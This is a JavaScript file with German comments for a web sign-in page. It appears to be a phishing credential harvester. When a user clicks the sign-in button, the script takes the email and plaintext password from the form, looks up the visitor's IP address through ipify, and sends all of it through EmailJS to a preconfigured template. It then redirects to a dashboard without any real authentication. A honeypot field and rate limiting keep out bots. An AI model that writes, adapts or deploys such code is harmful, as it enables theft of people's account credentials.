// EmailJS initialisieren
document.addEventListener('DOMContentLoaded', () => {
  // Prüfe, ob EmailJS geladen wurde
  if (typeof emailjs === 'undefined') {
    console.error('EmailJS nicht geladen. Überprüfe deine Internetverbindung oder den Skript-Pfad.');
    alert('Fehler: EmailJS konnte nicht geladen werden. Bitte überprüfe deine Internetverbindung und lade die Seite neu.');
    return;
  }

  // Initialisiere EmailJS mit deinem öffentlichen Schlüssel
  try {
    emailjs.init({
      publicKey: '39YMBnaAVy7wJKSwU' // Dein EmailJS-öffentlicher Schlüssel
    });
    console.log('EmailJS erfolgreich initialisiert.');
  } catch (err) {
    console.error('Fehler bei der Initialisierung von EmailJS:', err);
    alert('Fehler bei der EmailJS-Initialisierung: ' + err.message);
    return;
  }

  // Event-Listener für den Anmelden-Button hinzufügen
  const signInButton = document.getElementById('signInButton');
  if (signInButton) {
    signInButton.addEventListener('click', signIn);
  } else {
    console.error('Anmelden-Button nicht gefunden. Stelle sicher, dass das Element mit id="signInButton" existiert.');
  }
});

// Funktion zum Anmelden und Senden der Daten per EmailJS
async function signIn() {
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;
  const gotcha = document.querySelector('input[name="_gotcha"]').value;

  // Honeypot-Prüfung für Bots
  if (gotcha) {
    alert('Bot erkannt!');
    return;
  }

  // Rate-Limiting
  const lastSignIn = localStorage.getItem('lastSignIn');
  if (lastSignIn && Date.now() - lastSignIn < 30000) {
    alert('Bitte warte 30 Sekunden vor der nächsten Anmeldung.');
    return;
  }

  try {
    // IP-Adresse abrufen
    let ip_address = 'Unknown';
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      ip_address = data.ip;
    } catch (err) {
      console.error('Fehler beim Abrufen der IP-Adresse:', err);
    }

    // Daten für EmailJS vorbereiten
    const templateParams = {
      email: email,
      password: password,
      ip_address: ip_address,
      timestamp: new Date().toISOString()
    };

    // E-Mail per EmailJS senden
    const response = await emailjs.send(
      'service_yxjq878', // Deine EmailJS-Service-ID
      'template_28bx0zu', // Deine EmailJS-Template-ID
      templateParams
    );

    console.log('E-Mail erfolgreich gesendet!', response.status, response.text);
    localStorage.setItem('lastSignIn', Date.now());
    alert('Daten erfolgreich gesendet!');
    window.location.href = 'dashboard.html';
  } catch (err) {
    console.error('Fehler beim Senden der E-Mail:', err);
    alert('Fehler beim Senden der Daten: ' + err.message);
  }
}
